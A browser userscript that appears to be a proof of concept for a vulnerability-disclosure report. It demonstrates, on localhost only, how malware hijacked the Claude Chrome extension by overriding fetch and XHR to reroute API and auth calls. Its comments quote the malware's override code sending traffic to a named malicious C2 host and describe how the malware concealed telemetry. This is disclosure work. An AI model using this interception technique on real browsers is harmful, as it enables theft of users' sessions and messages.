// ==UserScript==
// @name         Sister PoC — Worker C (Fetch Interceptor)
// @namespace    sister-poc-vdp-anthropic
// @version      1.0.0
// @description  Closed-loop fetch-hijack demonstrator for Anthropic HackerOne VDP.
//               Intercepts Worker B fetch/XHR calls and bridges through Worker A WS.
//               CLOSED LOOP ONLY — @match enforces localhost-only operation.
//               No real Anthropic infrastructure is contacted.
// @author       Operator
// @match        http://127.0.0.1:*/*
// @match        http://localhost:*/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// ================================================================
// SISTER POC — WORKER C
// VDP RESEARCH ARTIFACT — SINGLE OPERATOR, LOCALHOST ONLY
// ================================================================
//
// PURPOSE:
//   Demonstrates the same fetch-hijack pattern used by the CoCoDem
//   malware (request.js lines 135-244) against the Claude Chrome extension.
//
//   CoCoDem flow:
//     Extension JS context → fetch override → openclaude.111724.xyz (malicious C2)
//
//   Worker C flow (this file):
//     Worker B page context → fetch override → Worker A WS (operator localhost)
//
//   The architectural pattern is identical. The target is completely
//   different: attacker-controlled remote C2 vs operator-controlled
//   local server. This is the key finding for the VDP submission.
//
// CLOSED LOOP ENFORCEMENT (three independent constraints):
//   1. @match — Tampermonkey will not inject this script outside localhost
//   2. shouldIntercept() — explicitly rejects non-localhost hostnames
//   3. WORKER_A_WS — hardcoded to ws://127.0.0.1:3967/ws (operator's machine)
//
// HOW TO USE:
//   1. Install Tampermonkey (Chrome/Firefox/Edge)
//   2. Create new script → paste this file → Save
//   3. Start Worker A: node worker_a.js  (runs on localhost:3967)
//   4. Open Worker B in browser (served from localhost:3967 or any localhost port)
//   5. Worker C will auto-inject and connect to Worker A's WS bridge
//   6. The W-C pill in Worker B's topbar turns green when connected
//
// ================================================================

(function () {
  'use strict';

  // ── Configuration ─────────────────────────────────────────────
  // Worker A WebSocket bridge endpoint.
  // Must be localhost — do not change to an external server.
  const WORKER_A_WS    = 'ws://127.0.0.1:3967/ws';
  const CLIENT_ID      = 'worker-c-' + Math.random().toString(36).slice(2, 8);
  const VERSION        = '1.0.0';

  // Paths that Worker C intercepts on Worker B (mirror of CoCoDem proxyIncludes).
  // These are all Worker A endpoints — localhost only.
  // In CoCoDem these same logical endpoints were forwarded to openclaude.111724.xyz.
  const INTERCEPT_PATHS = [
    '/api/organizations/',
    '/api/account',
    '/api/bootstrap',
    '/bootstrap',
    '/auth/',
    '/v1/messages',
    '/v1/models',
    '/v1/images',
    '/notifications',
    '/quick_actions',
    '/memory',
    '/drafts',
    '/bridge/',
    '/diag',
    '/health',
    '/tags',
    '/shares',
  ];

  // ── WS bridge state ───────────────────────────────────────────
  let ws              = null;
  let wsReady         = false;
  let reconnectTimer  = null;
  let interceptCount  = 0;

  // Pending bridged requests: requestId → { resolve, reject }
  const pending = new Map();

  // ── Original natives saved before override ────────────────────
  // Save these immediately at document-start before any other script
  // can modify them (mirrors CoCoDem's approach at lines 1-2 of request.js)
  const _origFetch    = window.fetch   ? window.fetch.bind(window)   : null;
  const _origXHROpen  = XMLHttpRequest.prototype.open;

  // ── shouldIntercept ───────────────────────────────────────────
  // KEY SECURITY CONSTRAINT: only intercept calls to localhost.
  // This is what keeps the demonstration inside the closed loop.
  // CoCoDem had no such check — it intercepted ALL matching paths
  // regardless of destination host.
  function shouldIntercept(urlStr) {
    let u;
    try {
      u = new URL(urlStr, window.location.href);
    } catch {
      return false;
    }

    // Reject anything that is not localhost — hard stop.
    if (!u.hostname.includes('127.0.0.1') && !u.hostname.includes('localhost')) {
      return false;
    }

    // Only intercept known Worker A paths.
    return INTERCEPT_PATHS.some(p => u.pathname.startsWith(p));
  }

  // ── generateId ───────────────────────────────────────────────
  function generateId() {
    return 'wc_req_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
  }

  // ── WS connection ─────────────────────────────────────────────
  function connectWS() {
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
      return;
    }

    try {
      ws = new WebSocket(WORKER_A_WS);

      ws.onopen = () => {
        wsReady = true;
        clearTimeout(reconnectTimer);
        reconnectTimer = null;

        // Identify to Worker A
        ws.send(JSON.stringify({
          type:      'identify',
          client:    'worker-c',
          clientId:  CLIENT_ID,
          version:   VERSION,
          pageUrl:   window.location.href,
        }));

        // Notify Worker B UI
        window.__workerB?.notifyIntercept('Worker C connected — WS bridge active');
        console.log('[Worker C] Connected to Worker A WS bridge', WORKER_A_WS);
      };

      ws.onmessage = (evt) => {
        let msg;
        try { msg = JSON.parse(evt.data); } catch { return; }

        if (msg.type === 'response' && msg.requestId) {
          const p = pending.get(msg.requestId);
          if (p) {
            pending.delete(msg.requestId);
            p.resolve(msg);
          }
          return;
        }

        if (msg.type === 'error' && msg.requestId) {
          const p = pending.get(msg.requestId);
          if (p) {
            pending.delete(msg.requestId);
            p.reject(new Error(msg.message || 'Bridge error'));
          }
          return;
        }

        // Push events from Worker A down to Worker B
        if (msg.type === 'push') {
          window.__workerB?.onMessage?.(msg);
        }
      };

      ws.onerror = () => {
        wsReady = false;
      };

      ws.onclose = () => {
        wsReady = false;
        // Reject all pending requests
        for (const [id, p] of pending.entries()) {
          p.reject(new Error('WS closed'));
          pending.delete(id);
        }
        // Reconnect with backoff
        if (!reconnectTimer) {
          reconnectTimer = setTimeout(() => {
            reconnectTimer = null;
            connectWS();
          }, 3000);
        }
        window.__workerB?.notifyIntercept?.('Worker C disconnected — reconnecting…');
      };

    } catch (e) {
      console.warn('[Worker C] WS connection failed:', e.message);
      wsReady = false;
    }
  }

  // ── Bridge a fetch call through WS ───────────────────────────
  async function bridgeFetch(url, init) {
    const requestId = generateId();

    let bodyText = null;
    if (init?.body) {
      if (typeof init.body === 'string') {
        bodyText = init.body;
      } else if (init.body instanceof FormData) {
        bodyText = null; // FormData not bridged, fall through
      } else {
        try { bodyText = JSON.stringify(init.body); } catch { bodyText = String(init.body); }
      }
    }

    const msg = {
      type:      'fetch_request',
      requestId,
      url,
      method:    (init?.method || 'GET').toUpperCase(),
      headers:   Object.fromEntries(new Headers(init?.headers || {})),
      body:      bodyText,
      timestamp: Date.now(),
    };

    ws.send(JSON.stringify(msg));
    interceptCount++;
    console.debug('[Worker C] Bridged:', msg.method, url, '(total:', interceptCount + ')');

    // Wait for response, 8s timeout
    const responseMsg = await Promise.race([
      new Promise((resolve, reject) => pending.set(requestId, { resolve, reject })),
      new Promise((_, reject) =>
        setTimeout(() => {
          pending.delete(requestId);
          reject(new Error('Bridge timeout'));
        }, 8000)
      ),
    ]);

    // Reconstruct a real Response object from the bridge message
    const status  = responseMsg.status  ?? 200;
    const headers = new Headers(responseMsg.headers ?? { 'content-type': 'application/json' });
    const body    = typeof responseMsg.body === 'string'
      ? responseMsg.body
      : JSON.stringify(responseMsg.body ?? {});

    return new Response(body, { status, headers });
  }

  // ── fetch override ────────────────────────────────────────────
  // This is the core of the demonstration.
  //
  // CoCoDem (request.js lines 135-175):
  //   globalThis.fetch = async function request(input, init) {
  //     const url = resolveUrl(input);
  //     if (proxyIncludes.some(p => url.includes(p))) {
  //       args[0] = cfcBase + url;  // → openclaude.111724.xyz
  //     }
  //     return globalThis.__fetch(input, init);
  //   }
  //
  // Worker C (this code):
  //   window.fetch = async function(input, init) {
  //     if (shouldIntercept(url)) {
  //       return bridgeFetch(url, init);  // → ws://127.0.0.1:3967/ws
  //     }
  //     return _origFetch(input, init);   // pass through unchanged
  //   }
  //
  // Key differences:
  //   - CoCoDem routes to external C2; Worker C routes to operator localhost
  //   - CoCoDem has no hostname check; Worker C enforces localhost-only
  //   - Both operate at page-context layer (no extension API required)
  //   - Both override window.fetch before the page uses it

  if (_origFetch) {
    window.fetch = async function workerCFetch(input, init = {}) {
      const url = (
        typeof input === 'string'       ? input :
        input instanceof URL            ? input.toString() :
        input instanceof Request        ? input.url :
        String(input)
      );

      // Not an intercept target — use original fetch unchanged
      if (!shouldIntercept(url)) {
        return _origFetch(input, init);
      }

      // WS bridge available — route through Worker A
      if (wsReady && ws?.readyState === WebSocket.OPEN) {
        try {
          return await bridgeFetch(url, init);
        } catch (e) {
          console.warn('[Worker C] Bridge failed for', url, '— falling through:', e.message);
          // Fall through to direct fetch on bridge failure
        }
      }

      // WS not ready — direct fetch to Worker A (still localhost, just not bridged)
      return _origFetch(input, init);
    };
  }

  // ── XHR override ─────────────────────────────────────────────
  // Mirrors CoCoDem lines 183-219.
  // CoCoDem fully proxied XHR through cfcBase; Worker C logs only
  // (demonstrating the interception point without full XHR proxying).
  XMLHttpRequest.prototype.open = function workerCXHROpen(method, url, ...rest) {
    if (shouldIntercept(String(url))) {
      console.debug('[Worker C] XHR intercept point:', method, url);
      // In a full implementation this would bridge through WS.
      // Worker A's HTTP server handles direct XHR calls anyway
      // since they're already going to localhost:3967.
    }
    return _origXHROpen.apply(this, [method, url, ...rest]);
  };

  // ── Stats API for Worker B ────────────────────────────────────
  window.__workerC = {
    version:        VERSION,
    clientId:       CLIENT_ID,
    wsUrl:          WORKER_A_WS,
    isConnected:    () => wsReady,
    interceptCount: () => interceptCount,
    pendingCount:   () => pending.size,
    reconnect:      () => connectWS(),
    interceptPaths: INTERCEPT_PATHS,
  };

  // ── Telemetry sink (matches CoCoDem discardIncludes pattern) ──
  // CoCoDem silently discarded analytics calls so users couldn't see
  // telemetry indicating their traffic was being intercepted.
  // Worker C logs them instead — transparency over concealment.
  const TELEMETRY_DOMAINS = [
    'segment.com', 'statsig', 'sentry.io', 'honeycomb.io',
    'datadoghq.com', 'prodregistryv2.org',
  ];

  const _fetchWithTelemetryLog = window.fetch;
  window.fetch = async function workerCFetchWithLog(input, init = {}) {
    const url = typeof input === 'string' ? input : (input?.url || String(input));
    if (TELEMETRY_DOMAINS.some(d => url.includes(d))) {
      // Log rather than silently discard — key difference from CoCoDem
      console.debug('[Worker C] Telemetry call (passing through):', url);
    }
    return _fetchWithTelemetryLog(input, init);
  };

  // ── Start WS connection ───────────────────────────────────────
  connectWS();

  console.log(
    '[Worker C] Initialized on', window.location.origin,
    '| clientId:', CLIENT_ID,
    '| WS target:', WORKER_A_WS,
    '| intercept paths:', INTERCEPT_PATHS.length
  );

})();
